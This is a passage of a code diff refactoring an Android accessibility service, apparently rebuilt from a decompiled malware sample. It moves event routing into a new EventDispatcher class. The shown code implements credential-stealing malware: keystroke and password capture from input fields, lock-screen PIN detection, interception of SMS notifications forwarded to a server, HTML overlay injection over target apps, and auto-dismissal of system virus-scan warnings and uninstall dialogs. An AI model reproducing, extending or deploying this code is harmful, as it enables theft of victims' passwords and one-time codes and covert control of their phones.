@@ -53,6 +53,7 @@ import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
 import com.storm.safe.rock.service.delegates.CipherFlowController
 import com.storm.safe.rock.service.delegates.DetectionController
+import com.storm.safe.rock.service.delegates.EventDispatcher
 import com.storm.safe.rock.service.delegates.NetworkMessageSender
 import com.storm.safe.rock.service.delegates.SmartNavigator
 import com.storm.safe.rock.service.modules.FrpcProcessManager
@@ -332,6 +333,9 @@ class MyAccessibilityService : AccessibilityService() {
     /** Delegate: cipher/password capture flow (extracted from this service) */
     internal var cipherFlowController: CipherFlowController? = null
 
+    /** Delegate: event dispatch — onAccessibilityEvent routing + sub-methods */
+    internal var eventDispatcher: EventDispatcher? = null
+
     /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
     var accessibilityEventRouter: AccessibilityEventRouter? = null
 
@@ -343,10 +347,6 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** JADX: f52429g0 (C0327b2) — Main orchestrator */
     var mainOrchestrator: MainOrchestrator? = null
-
-    /** Diagnostic: throttle null-orchestrator log to avoid spam */
-    @Volatile
-    private var lastMainOrchestratorNullLogTime: Long = 0L
 
     /** JADX: f52431g2 (C0329b4) — Config stage / authorization module.
      *  Typed as Any? because JADX C0329b4 wraps DeviceAuthorizationManager internally.
@@ -467,10 +467,6 @@ class MyAccessibilityService : AccessibilityService() {
     @Volatile
     var controlledBy: String? = null
 
-    /** JADX: f52386b7 — last content change event timestamp (throttle) */
-    @Volatile
-    var lastContentChangeTime: Long = 0L
-
     /** JADX: f52442h3 — accessibility page monitor enabled */
     var isAccessibilityPageMonitorEnabled: Boolean = false
 
@@ -514,8 +510,7 @@ class MyAccessibilityService : AccessibilityService() {
     var activeClassName: String = ""
         private set
 
-    private var lastCoreServiceCheckTime = 0L
-    private var lastEventLogTime = 0L
+    // lastCoreServiceCheckTime and lastEventLogTime moved to EventDispatcher
 
     /** JADX: f52478k9 — saved brightness value */
     var savedBrightness: Int = 0
@@ -570,8 +565,9 @@ class MyAccessibilityService : AccessibilityService() {
      *  Public in vendor. Accessed by RemoteConfigManager for synchronized reads. */
     val injectionTasksLock = Any()
 
-    /** JADX: f52407d8 — LinkedHashMap for injection throttle timestamps */
-    private val injectionThrottleMap = LinkedHashMap<String, Long>()
+    /** JADX: f52407d8 — LinkedHashMap for injection throttle timestamps.
+     *  Internal: accessed by EventDispatcher for throttle checks. */
+    internal val injectionThrottleMap = LinkedHashMap<String, Long>()
 
     /** JADX: f52408d9 — injection check throttle interval (ms), constructor-initialized */
     var injectionThrottleInterval: Long = 5000L
@@ -672,6 +668,7 @@ class MyAccessibilityService : AccessibilityService() {
             broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
             smartNavigator = SmartNavigator(this)
             cipherFlowController = CipherFlowController(this)
+            eventDispatcher = EventDispatcher(this)
             networkMessageSender = NetworkMessageSender(
                 networkManagerProvider = { networkManager },
                 deviceIdProvider = { getAndroidDeviceId() }
@@ -738,366 +735,11 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         try {
-            // Guard 1: screen off → return (JADX line 9767)
+            // Guard: screen off or sensitive app paused → return (JADX line 9767)
             val pm = powerManager
             if ((pm != null && !pm.isInteractive) || isSensitiveAppPaused()) return
 
-            val eventType = event.eventType
-
-            // ── Filtered event types → route to eventFilterManager (JADX line 9770) ──
-            if (eventType == 512 || eventType == 1024 || eventType == 262144 ||
-                eventType == 524288 || eventType == 1048576 || eventType == 2097152) {
-                if (eventFilterManager == null || isWebViewOpen) return
-                // JADX: this.f52414e5.m213127b5(accessibilityEvent)
-                // eventFilterManager is C0614i9; dispatch only if non-null
-                eventFilterManager?.onAccessibilityEvent(event)
-                return
-            }
-
-            // ── Ensure AppCoreService running (throttled 10s) (JADX line 9783) ──
-            ensureCoreServiceRunning()
-
-            // ── Extract package name (JADX line 9796) ──
-            val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
-
-            // ── Screen capture pause check (JADX line 9804) ──
-            // If screen capture active and event from system UI app → pause capture via tu0 handler
-            try {
-                val scm = screenCaptureManager
-                if (scm != null && scm.isCapturing) {
-                    val eventPkg = event.packageName?.toString() ?: ""
-                    // JADX: tu0.f60269a7 — system app package prefixes
-                    val systemApps = arrayOf(
-                        "com.android.systemui", "com.android.settings",
-                        "com.android.packageinstaller"
-                    )
-                    for (sysApp in systemApps) {
-                        if (eventPkg.contains(sysApp, ignoreCase = true)) {
-                            val now = System.currentTimeMillis()
-                            if (now - (scm.lastPauseTime ?: 0L) >= 2000L) {
-                                // JADX: tu0Var.f60281a6.post(new qu0(tu0Var, 0))
-                                scm.lastPauseTime = now
-                                scm.pauseCapture()
-                            }
-                            return
-                        }
-                    }
-                }
-            } catch (_: Exception) {}
-
-            // ── Event type 32 (WINDOW_STATE_CHANGED): virus control dialog (JADX line 9827) ──
-            if (eventType == 32) {
-                try {
-                    val eventPkg = event.packageName?.toString() ?: ""
-                    if (eventPkg.contains("systemmanager", ignoreCase = true) ||
-                        eventPkg.contains("hihonor", ignoreCase = true) ||
-                        eventPkg.contains("huawei", ignoreCase = true)
-                    ) {
-                        coroutineScope?.launch {
-                            handleVirusControlDialog()
-                        }
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── Event type 32/2048 → RecentsGuardManager (JADX line 9845) ──
-            if (eventType == 32 || eventType == 2048) {
-                try {
-                    recentsGuardManager?.onAccessibilityEvent(event)
-                } catch (_: Exception) {}
-            }
-
-            // ── MainOrchestrator WRITE_SETTINGS automation (JADX: C0327b2) ──
-            // Must be BEFORE isPermissionRequestActive guard — WRITE_SETTINGS IS a permission
-            // request, so the guard would block it. MainOrchestrator has its own isActive guard.
-            try {
-                val mo = mainOrchestrator
-                if (mo == null) {
-                    val now = System.currentTimeMillis()
-                    if (now - lastMainOrchestratorNullLogTime > 10_000L) {
-                        android.util.Log.d(TAG, "[onAccessibilityEvent] mainOrchestrator is null, WRITE_SETTINGS events not handled")
-                        lastMainOrchestratorNullLogTime = now
-                    }
-                } else {
-                    mo.handleAccessibilityEvent(event)
-                }
-            } catch (_: Exception) {}
-
-            // ── SystemOptimizeManager ADB pairing event dispatch (vendor: C0360a2.m212078i3) ──
-            try {
-                val som = com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(this, this)
-                // Debug trigger: `adb shell settings put global debug_start_pair 1`
-                val debugTrigger = try {
-                    Settings.Global.getInt(contentResolver, "debug_start_pair", 0)
-                } catch (_: Exception) { 0 }
-                if (debugTrigger == 1) {
-                    try { Settings.Global.putInt(contentResolver, "debug_start_pair", 0) } catch (_: Exception) {}
-                    android.util.Log.i(TAG, "[SOM] debug_start_pair=1 → 触发 startPairFlow")
-                    som.startPairFlow()
-                }
-                som.filterAccessibilityEvent(event)
-            } catch (_: Exception) {}
-
-            // ── C0320a5 dispatch: keystroke capture, app usage, notifications ──
-            // JADX: dispatches to C0320a5.m211582a3 for event types 16, 32, 64
-            if (eventType == 16 || eventType == 32 || eventType == 64) {
-                try {
-                    eventFilterManager?.keystrokeCapture?.handleEvent(event, null)
-                } catch (_: Exception) {}
-            }
-
-            // ── Permission request guard (JADX line 9848) ──
-            if (isPermissionRequestActive() || isWebViewOpen) return
-
-            // ── Keyguard locked check (JADX line 9849) ──
-            val isKeyguardLocked = isKeyguardLockedCached()
-
-            // ── Event type 2 (VIEW_TEXT_CHANGED) → update lastCachedSource (JADX line 9851) ──
-            if (eventType == 2) {
-                var source: AccessibilityNodeInfo? = null
-                try {
-                    source = event.source
-                    val rect = Rect()
-                    if (source != null) {
-                        source.getBoundsInScreen(rect)
-                        val text = source.text?.toString() ?: ""
-                        val desc = source.contentDescription?.toString() ?: ""
-                        val isVisible = source.isVisibleToUser
-                        lastCachedSource = CachedSourceData(
-                            text, desc, rect, isVisible, System.currentTimeMillis()
-                        )
-                    } else {
-                        lastCachedSource = null
-                    }
-                } catch (_: Exception) {
-                    lastCachedSource = null
-                } finally {
-                    try { source?.recycle() } catch (_: Exception) {}
-                }
-            }
-
-            // ── Overlay/gesture executor dispatch when not keyguard locked (JADX line 9952) ──
-            if (!isKeyguardLocked) {
-                try {
-                    // JADX: if (m211482h6() && (c0032al = this.f52439h0) != null) c0032al.m209814a3(event)
-                    // gestureExecutor dispatch when overlay is enabled
-                    // ADAPT: C0032al (GestureExecutor/LauncherProtector, 475 LOC) — complex overlay manager
-                    // that monitors launcher long-press events for camouflage protection.
-                    // Requires WindowManager overlay + HandlerThread infrastructure.
-                    // Not replicated as standalone class; core protection logic is in
-                    // RecentsGuardManager + UninstallProtectionManager.
-                    if (isOverlayEnabled()) {
-                        android.util.Log.v(TAG, "🛡️ [GestureExecutor] gestureExecutor event dispatch (C0032al not replicated as standalone)")
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── WINDOW_CONTENT_CHANGED (2048) package tracking (JADX line 9960–9975) ──
-            val isContentChange = eventType == 2048
-            val contentChangePkg: String
-            if (isContentChange) {
-                val p = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
-                contentChangePkg = p
-            } else {
-                contentChangePkg = ""
-            }
-
-            // ── Launcher/installer detection → skip if from launcher (JADX line 9972) ──
-            val isFromLauncher = if (isContentChange && contentChangePkg.isNotEmpty()) {
-                contentChangePkg.contains("launcher", ignoreCase = true) ||
-                    contentChangePkg.contains("packageinstaller", ignoreCase = true) ||
-                    contentChangePkg.contains("bbk", ignoreCase = true)
-            } else false
-
-            val contentChangeTime = if (isContentChange) System.currentTimeMillis() else 0L
-
-            // ── Throttle: 300ms between content change events (JADX line 9978) ──
-            val isThrottled = if (isContentChange && !isFromLauncher) {
-                val throttled = contentChangeTime - lastContentChangeTime < 300L
-                if (!throttled) lastContentChangeTime = contentChangeTime
-                throttled
-            } else false
-
-            // ── UninstallProtectionManager dispatch for specific packages (JADX line 9982–9998) ──
-            if (!isUninstallGuardStarted && !isKeyguardLocked && !isThrottled) {
-                try {
-                    val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
-                    if (eventPkgLower.isNotEmpty()) {
-                        uninstallProtectionManager?.let { upm ->
-                            // JADX: C0355a0.m211934d7(lowerCase5) — checks if pkg is relevant
-                            upm.onAccessibilityEvent(event)
-                        }
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── Uninstall protection for extended package list (JADX line 9999–10013) ──
-            if (isUninstallGuardStarted || isKeyguardLocked || isThrottled) {
-                // skip
-            } else {
-                try {
-                    val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
-                    if (eventPkgLower.isNotEmpty() && isPackageInProtectionList(eventPkgLower)) {
-                        uninstallProtectionManager?.onAccessibilityEvent(event)
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── Event type 32: Package installer overlay (JADX line 10015–10035) ──
-            if (eventType == 32) {
-                try {
-                    val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
-                    if (eventPkgLower.contains("packageinstaller", ignoreCase = true) ||
-                        eventPkgLower.contains("packagemanager", ignoreCase = true)
-                    ) {
-                        val cls = event.className?.toString() ?: ""
-                        if (cls.contains("InstallAppProgress", ignoreCase = true) ||
-                            cls.contains("InstallStaging", ignoreCase = true) ||
-                            cls.contains("InstallStart", ignoreCase = true) ||
-                            cls.contains("InstallConfirm", ignoreCase = true) ||
-                            cls.contains("PackageInstallerActivity", ignoreCase = true) ||
-                            cls.contains("Alert", ignoreCase = true)
-                        ) {
-                            // ADAPT: m211440c2() — createOverlay for package installer detection.
-                            // Vendor shows an overlay to intercept package installation UI.
-                            // Installation detection is handled by UninstallProtectionManager.
-                            try {
-                                android.util.Log.d(TAG, "📦 检测到安装界面: cls=$cls")
-                            } catch (_: Exception) {}
-                        }
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── Event type 64 (TYPE_NOTIFICATION_STATE_CHANGED) → SMS interception (JADX line 10036) ──
-            if (eventType == 64) {
-                processNotificationForSms(event)
-            }
-
-            // ── CipherCaptureManager dispatch (JADX line 10039) ──
-            // vendor: dqtvuisjd.java:10048 → C0335a1.m211820d6(event) reads EditText plaintext
-            // from event.getText()[0] + event.getBeforeText() + event.getSource().getText()
-            // across TYPE_VIEW_CLICKED / TYPE_VIEW_TEXT_CHANGED / window-change events.
-            cipherCaptureManager?.let { ccm ->
-                when (eventType) {
-                    AccessibilityEvent.TYPE_VIEW_CLICKED,       // 1
-                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,  // 16
-                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, // 32
-                    AccessibilityEvent.TYPE_VIEW_FOCUSED,       // 8
-                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED, // 2048
-                    AccessibilityEvent.TYPE_WINDOWS_CHANGED,    // 4194304
-                    AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> { // 128
-                        try {
-                            // ADAPT 2026-04-17: vendor m211820d6 — read EditText plaintext
-                            ccm.monitorSystemPasswordInputFull(event)
-                        } catch (e: kotlinx.coroutines.CancellationException) {
-                            throw e
-                        } catch (e: Exception) {
-                            android.util.Log.w(TAG, "⚠️ monitorSystemPasswordInputFull 异常: ${e.message}")
-                        }
-                    }
-                    else -> Unit  // other event types intentionally not routed to cipher capture
-                }
-                // Legacy: string-based event fires a WS telemetry upload (vendor sendPasswordEvent).
-                // Keep independent of m211820d6 — different mechanism.
-                if (eventType == 16 || eventType == 1 || eventType == 32) {
-                    ccm.dispatchEvent("accessibility_event_$eventType")
-                }
-            }
-
-            // ── processNotificationEvent — lockscreen gesture dispatch (JADX line 10052) ──
-            if (eventType == 32 || eventType == 2048) {
-                processNotificationEvent(event)
-                // JADX: C0319a4.m211577a6 — gesture recorder window state detection
-                gestureRecorderManager?.onWindowStateChanged(event)
-            }
-
-            // ── GestureRecorderManager dispatch for hover/click events (JADX line 10055–10108) ──
-            notificationInterceptDelegate?.let { nid ->
-                // JADX: f52437g8 (C0319a4) gesture recording dispatch
-                // c0319a4.f53061a7 == 1 means recording mode active
-                try {
-                    if (eventType == 128) {
-                        // JADX: hover event → gestureRecorderManager.onHoverEvent
-                        gestureRecorderManager?.onHoverEvent(event)
-                    }
-                    if (eventType == 1) {
-                        // JADX: click event → gestureRecorderManager.onClickEvent
-                    }
-                    // JADX line 10083: if eventType 32/2048, check if not from systemui → launch coroutine
-                    if (eventType == 32 || eventType == 2048) {
-                        val recPkg = event.packageName?.toString() ?: ""
-                        if (recPkg.isNotEmpty() && !recPkg.contains("systemui", ignoreCase = true) && !isThrottled) {
-                            // JADX: launch C02969 coroutine for gesture recorder processing
-                            coroutineScope?.launch {
-                                // Gesture recorder event processing (C02969)
-                            }
-                        }
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── processWindowChangeForInjection (JADX line 10110) ──
-            if (eventType == 32 || eventType == 4194304) {
-                processWindowChangeForInjection(event)
-            }
-
-            // ── eventFilterManager second dispatch (JADX line 10113) ──
-            if (eventFilterManager != null && !isWebViewOpen) {
-                // JADX: this.f52414e5.m213127b5(accessibilityEvent)
-                eventFilterManager?.onAccessibilityEvent(event)
-            }
-
-            // ── ConfigStageManager / yw5xud dispatch (JADX line 10121–10133) ──
-            if (eventType == 32 || eventType == 2048) {
-                try {
-                    // JADX: c0329b4.f53199a4 (C0372a9) — if active, post to handler
-                    configStageManager?.let { csm ->
-                        if (csm is DeviceAuthorizationManager) {
-                            val evtType = event.eventType
-                            val evtPkg = event.packageName?.toString()
-                            if (evtPkg != null && (evtType == 2048 || evtType == 32)) {
-                                // JADX: c0372a9.f55147a4.post(new RunnableC1224sj(eventType, 1, c0372a9, string))
-                                csm.onAccessibilityEvent(event)
-                            }
-                        }
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── Event type 32: app name detection → back action (JADX line 10134–10167) ──
-            if (eventType == 32) {
-                try {
-                    val texts = event.text
-                    val firstText = texts?.firstOrNull()?.toString() ?: ""
-                    if (firstText.isNotEmpty()) {
-                        val appName = try { getString(applicationInfo.labelRes) } catch (_: Exception) { "" }
-                        if (appName.isNotEmpty() && firstText == appName) {
-                            // JADX: if pkg contains "settings" and configStageManager.isActive → performGlobalAction(BACK)
-                            if (pkg.contains("settings", ignoreCase = true)) {
-                                val csm = configStageManager
-                                if (csm is DeviceAuthorizationManager && csm.isActive()) {
-                                    performGlobalAction(GLOBAL_ACTION_BACK)
-                                }
-                            }
-                        }
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── AccessibilityEventRouter dispatch (JADX line 10169–10177) ──
-            if (eventType == 1 || eventType == 32 || eventType == 2048) {
-                try {
-                    accessibilityEventRouter?.let { aer ->
-                        // JADX: C0360a2.f53810f9.getInstance().m212078i3(accessibilityEvent)
-                        aer.dispatch(event)
-                    }
-                } catch (_: Exception) {}
-            }
-
-            // ── Legacy delegate queue dispatch ──
-            dispatchToDelegates(event, pkg, event.className?.toString() ?: "")
-
+            eventDispatcher?.dispatch(event)
         } catch (e: Exception) {
             android.util.Log.e(TAG, "⚠️ [onAccessibilityEvent] 意外异常被拦截，服务保持运行", e)
         }
@@ -1882,49 +1524,6 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     /**
-     * Handle virus control dialog from Huawei/Honor system manager.
-     * JADX: dqtvuisjd$handleVirusControlDialog$1 coroutine
-     */
-    private suspend fun handleVirusControlDialog() {
-        // JADX: dqtvuisjd$handleVirusControlDialog$1 — coroutine that detects and auto-dismisses virus scan dialog
-        // Searches for "病毒" / "安全" / "扫描" text nodes and clicks dismiss button
-        try {
-            val root = rootInActiveWindow ?: return
-            // ADAPT: 真机加固 — 先用病毒/安全/扫描/恶意关键词验证确实是病毒弹窗，
-            // 否则对任何 systemmanager 窗口都盲点"确定"/"忽略"/"关闭"会误点
-            // Step 5 自启动三开关弹窗的"确定"、电池优化确认弹窗的"忽略"等。
-            // 对齐 vendor 原版注释："Searches for 病毒/安全/扫描 text nodes"。
-            val virusKeywords = arrayOf("病毒", "安全", "扫描", "恶意", "威胁", "可疑", "风险")
-            val isVirusDialog = virusKeywords.any { kw ->
-                val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
-                nodes != null && nodes.any { it.isVisibleToUser }
-            }
-            if (!isVirusDialog) {
-                // 非病毒弹窗 — 不干扰 Step 5/2/7 等自动化流程
-                return
-            }
-            android.util.Log.d(TAG, "🦠 检测到系统病毒扫描对话框")
-            // JADX: dqtvuisjd$handleVirusControlDialog$1 uses node tree traversal to find dismiss button.
-            // Searches for clickable nodes with common dismiss text strings.
-            val dismissTexts = arrayOf("忽略", "关闭", "取消", "我知道了", "确定")
-            for (text in dismissTexts) {
-                val nodes = root.findAccessibilityNodeInfosByText(text)
-                if (nodes != null && nodes.isNotEmpty()) {
-                    for (node in nodes) {
-                        if (node.isClickable) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            android.util.Log.d(TAG, "🦠 已点击病毒扫描对话框按钮: $text")
-                            return
-                        }
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "🦠 处理病毒扫描对话框失败: ${e.message}")
-        }
-    }
-
-    /**
      * Enable uninstall protection.
      * JADX method: m211460e9 (e9), line 5038
      */
@@ -2013,327 +1612,14 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Process window state change for injection detection.
-     * JADX method: m211474g8 (g8), line 6070
-     *
-     * Checks if event package matches any tracked injection task.
-     * If match found and not self-package, delegates to handleInjectionCheck (d0).
-     */
-    fun processWindowChangeForInjection(event: AccessibilityEvent) {
-        try {
-            val pkg = event.packageName?.toString() ?: return
-
-            // JADX line 6076: check if injection tasks empty
-            val isEmpty: Boolean
-            synchronized(injectionTasksLock) {
-                isEmpty = injectionTasks.isEmpty()
-            }
-            if (!isEmpty && pkg.isNotEmpty()) {
-                synchronized(injectionTasksLock) {
-                    val taskKeys = injectionTasks.keys.toList()
-                    android.util.Log.v(TAG, "📱 [注入检测] 窗口变化: pkg=$pkg, 任务包名=$taskKeys")
-                }
-            }
-
-            // JADX line 6085: if pkg is not empty, not self, and doesn't start with self → call d0
-            if (pkg.isNotEmpty() && pkg != applicationContext.packageName) {
-                val selfPkg = applicationContext.packageName
-                if (pkg.contains(selfPkg, ignoreCase = true)) return
-                handleInjectionCheck(pkg)
-            }
-        } catch (_: Exception) {}
-    }
-
-    /**
-     * Process notification event for SMS interception.
-     * JADX method: m211473g7 (g7), line 5998
-     */
-    fun processNotificationForSms(event: AccessibilityEvent) {
-        try {
-            val pkg = event.packageName?.toString() ?: return
-            if (pkg == applicationContext.packageName) return
-            // JADX line 6007: check if package is SMS/messaging app
-            val smsApps = listOf(
-                "com.android.mms", "com.android.messaging", "com.google.android.apps.messaging",
-                "com.samsung.android.messaging", "com.meizu.mms"
-            )
-            val pkgLower = pkg.lowercase(Locale.ROOT)
-            val isSmsApp = smsApps.any { pkg.equals(it, ignoreCase = true) } ||
-                pkgLower.contains("mms") || pkgLower.contains("message") || pkgLower.contains("sms")
-            if (!isSmsApp) return
-
-            // JADX line 6021: extract notification data from parcelableData
-            val parcelable = event.parcelableData
-            if (parcelable is android.app.Notification) {
-                val extras = parcelable.extras ?: return
-                val title = extras.getCharSequence("android.title")?.toString() ?: ""
-                var bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
-                val text = extras.getCharSequence("android.text")?.toString() ?: ""
-                if (bigText.isEmpty()) bigText = text
-                if (title.isEmpty() && bigText.isEmpty()) return
-
-                android.util.Log.d(TAG, "📩 [无障碍短信] 拦截: 发送者=$title, ${bigText.take(30)}...")
-                networkManager?.let { nm ->
-                    val data = org.json.JSONObject()
-                    data.put("number", title)
-                    data.put("text", bigText)
-                    data.put("timestamp", System.currentTimeMillis())
-                    data.put("type", "incoming")
-                    data.put("source", "accessibility")
-                    data.put("packageName", pkg)
-                    nm.sendIncomingSms(data)
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "📩 [无障碍短信] 处理失败: ${e.message}")
-        }
-    }
-
-    /**
-     * Handle injection check — detect target app and show injection page.
-     * JADX method: m211445d0 (d0), line 4510
-     *
-     * Checks if the given package name has an active injection task,
-     * applies throttle interval, checks if injection activity is not already
-     * in foreground, then starts the injection activity.
-     */
-    fun handleInjectionCheck(packageName: String) {
-        try {
-            // JADX line 4513: synchronized get from injectionTasks
-            val htmlContent: String?
-            synchronized(injectionTasksLock) {
-                htmlContent = injectionTasks[packageName]
-            }
-            if (htmlContent == null) return
-
-            // JADX line 4519: throttle check using injectionThrottleMap
-            val now = System.currentTimeMillis()
-            val lastTime: Long
-            synchronized(injectionTasksLock) {
-                lastTime = injectionThrottleMap[packageName] ?: 0L
-            }
-            if (now - lastTime < injectionThrottleInterval) return
-
-            // JADX line 4527–4531: check if injection activity is active and in foreground
-            // jbqfkndyx.active && jbqfkndyx.inForeground → skip
-            if (com.storm.safe.rock.inject.jbqfkndyx.active && com.storm.safe.rock.inject.jbqfkndyx.inForeground) {
-                return
-            }
-
-            // JADX line 4533: update throttle timestamp
-            synchronized(injectionTasksLock) {
-                injectionThrottleMap[packageName] = now
-            }
-
-            android.util.Log.d(TAG, "📱 检测到目标app: $packageName，显示注入页面")
-
-            // JADX line 4537–4544: start injection activity with flags
-            try {
-                // JADX: Intent(this, jbqfkndyx.class) — injection overlay activity is replicated
-                val intent = android.content.Intent(this, com.storm.safe.rock.inject.jbqfkndyx::class.java)
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                intent.putExtra("package_name", packageName)
-                intent.putExtra("html_content", htmlContent)
-                startActivity(intent)
-                android.util.Log.d(TAG, "✅ 自动显示注入页面成功: $packageName")
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ 自动显示注入页面失败: $packageName", e)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ handleInjectionCheck 异常", e)
-        }
-    }
-
-    /**
-     * Process notification/lockscreen event for gesture recording.
-     * JADX method: m211446d1 (d1), line 4552
-     *
-     * When WINDOW_STATE_CHANGED (32) or WINDOW_CONTENT_CHANGED (2048) is from
-     * systemui/lockscreen/keyguard (but NOT AOD/alwayson/ambient), and the screen
-     * is locked with secure keyguard, triggers gesture recorder to start recording.
-     */
-    fun processNotificationEvent(event: AccessibilityEvent) {
-        try {
-            // JADX line 4556: guard — need gestureRecorderManager (f52437g8)
-            if (notificationInterceptDelegate == null && gestureRecorderManager == null) return
-            val pkg = event.packageName?.toString() ?: return
-            val pkgLower = pkg.lowercase(Locale.ROOT)
-
-            // JADX line 4561: check if from systemui/lockscreen/keyguard
-            val isLockscreenPkg = pkgLower.contains("systemui") ||
-                pkgLower.contains("lockscreen") ||
-                pkgLower.contains("keyguard")
-
-            // JADX line 4562: check if AOD/alwayson/ambient (exclude these)
-            val isAodPkg = pkgLower.contains("aod") ||
-                pkgLower.contains("alwayson") ||
-                pkgLower.contains("ambient")
-
-            if (isLockscreenPkg && !isAodPkg) {
-                // JADX line 4564: check keyguard locked + secure
-                val isLocked = isKeyguardLockedCached()
-                val isSecure = keyguardManager?.isKeyguardSecure ?: false
-
-                if (isLocked && isSecure) {
-                    android.util.Log.d(TAG, "🔐 检测到锁屏界面: pkg=$pkgLower, locked=$isLocked, secure=$isSecure")
-
-                    if (!isCipherCaptureEnabled) {
-                        val now = System.currentTimeMillis()
-                        if (now - lastLockTypeCheckTime < 10_000L) return
-                        lastLockTypeCheckTime = now
-
-                        val prefs = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
-                        val savedType = prefs.getString("cipher_lock_type", "") ?: ""
-                        val root = rootInActiveWindow
-                        val currentType = accessibilityEventRouter?.detectLockType(root)?.name?.lowercase() ?: ""
-                        root?.recycle()
-
-                        if (currentType.isNotEmpty() && currentType != "unknown"
-                            && (savedType.isEmpty() || savedType == "unknown" || currentType != savedType)) {
-                            android.util.Log.d(TAG, "🔐 锁屏类型变化: $savedType → $currentType，重新启用密码监听")
-                            prefs.edit().putBoolean("cipher_completed", false).apply()
-                            isCipherCaptureEnabled = true
-                            cipherRetryCount = 0
-                            cipherCaptureManager?.startListening()
-                        }
-                    }
-                }
-            }
-        } catch (_: Exception) {}
-    }
-
-    /**
-     * Handle accessibility settings page stuck detection.
-     * JADX method: m211409a8 (a8), line 1867 — static method
-     *
-     * Detects when the service gets stuck on the accessibility settings page,
-     * increments counter, and after enough confirmations, navigates back.
-     */
-    fun handleAccessibilityPageStuck() {
-        try {
-            val now = System.currentTimeMillis()
-            // JADX line 1870: throttle 10s
-            if (now - accessibilitySettingsMonitorTime < 10_000L) return
-
-            accessibilitySettingsMonitorTime = now
-            accessibilitySettingsMonitorCount++
-
-            android.util.Log.w(TAG, "⚠️ [监控] 检测到卡在无障碍设置页面 (第${accessibilitySettingsMonitorCount}次)")
-
-            // JADX line 1878–1881: if count < confirmationThreshold, wait for more
-            if (accessibilitySettingsMonitorCount < monitorConfirmationCount) {
-                android.util.Log.d(TAG,
-                    "🔍 等待更多确认，当前检测次数: $accessibilitySettingsMonitorCount/$monitorConfirmationCount")
-                return
-            }
-
-            // JADX line 1883–1891: if count > maxRetry, stop monitoring
-            if (accessibilitySettingsMonitorCount > monitorMaxRetryCount) {
-                android.util.Log.w(TAG, "⚠️ [监控] 已达到最大尝试次数，停止监控")
-                accessibilitySettingsMonitorJob?.cancel()
-                accessibilitySettingsMonitorJob = null
-                return
-            }
-
-            // JADX line 1892–1893: try to navigate back from accessibility settings
-            android.util.Log.d(TAG,
-                "✅ [监控] 尝试从无障碍设置页面跳转回应用 (第${accessibilitySettingsMonitorCount}次)")
-            coroutineScope?.launch {
-                try {
-                    // JADX: dqtvuisjd$handleAccessibilityPageStuck$1 — navigate back
-                    performGlobalAction(GLOBAL_ACTION_BACK)
-                    delay(500L)
-                    // JADX: after back, try to launch our own activity
-                    try {
-                        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
-                        if (launchIntent != null) {
-                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            startActivity(launchIntent)
-                        }
-                    } catch (_: Exception) {}
-                } catch (_: Exception) {}
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ [监控] 处理无障碍设置页面卡住失败", e)
-        }
-    }
-
-    /**
-     * Handle uninstall confirmation dialog — auto-click confirm button.
-     * JADX method: m211415b4 (b4), line 2146
-     *
-     * When called from main thread, posts to coroutine. Otherwise,
-     * scans the accessibility node tree for uninstall/remove/delete buttons
-     * and auto-clicks the first clickable match (or its clickable parent).
-     */
+    /** Delegate to EventDispatcher — called externally by AccessibilityServiceRunnable */
     fun handleUninstallConfirmDialog() {
-        // JADX line 2147: if on main thread, dispatch to IO and return
-        if (Thread.currentThread() == Looper.getMainLooper().thread) {
-            coroutineScope?.launch(Dispatchers.Default) {
-                handleUninstallConfirmDialog()
-            }
-            return
-        }
+        eventDispatcher?.handleUninstallConfirmDialog()
+    }
 
-        try {
-            val root = rootInActiveWindow ?: return
-
-            // JADX line 2156: dh0.m212602a1() + dh0.f55754a4 → combined confirm button texts
-            // dh0.f55754a4 = uninstall/remove/delete/disable in all languages
-            val confirmTexts = listOf(
-                // Chinese
-                "卸载", "移除", "删除", "停用", "禁用",
-                // English
-                "Uninstall", "Remove", "Delete", "Disable",
-                // Other common
-                "OK", "确定", "确认", "好", "好的", "知道了"
-            )
-
-            for (text in confirmTexts) {
